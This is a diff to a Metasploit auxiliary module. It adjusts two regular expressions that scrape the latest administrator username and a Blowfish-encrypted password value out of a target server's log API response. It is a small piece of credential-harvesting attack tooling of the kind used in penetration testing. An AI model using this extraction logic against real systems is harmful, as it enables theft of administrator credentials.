@@ -75,7 +75,7 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::Unknown, 'Connection failed - unable to get log API response') unless res
 
     # Grab the most recent (last) administrator username value from the logs
-    pattern = /accessuser\s*=\s*(\S+)\n/
+    pattern = / accessuser\s*=\s*(\S+)/
     result = res.body.scan(pattern).last
 
     # If the log has been cleared since startup or the server hasn't restarted since setup
@@ -87,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # Grab the most recent (last) password value from the logs to decrypt
     # "||" + hex number (key index) + hex Blowfish ECB ciphertext
-    pattern = /\|\|([0-9A-F]){1}([a-fA-F0-9]{16}(?:[a-fA-F0-9]{4})*)\n/
+    pattern = /\|\|([0-9A-F]){1}([a-fA-F0-9]+)/
     result = res.body.scan(pattern).last
 
     # If the log has been cleared since the last password change or the server hasn't restarted since setup
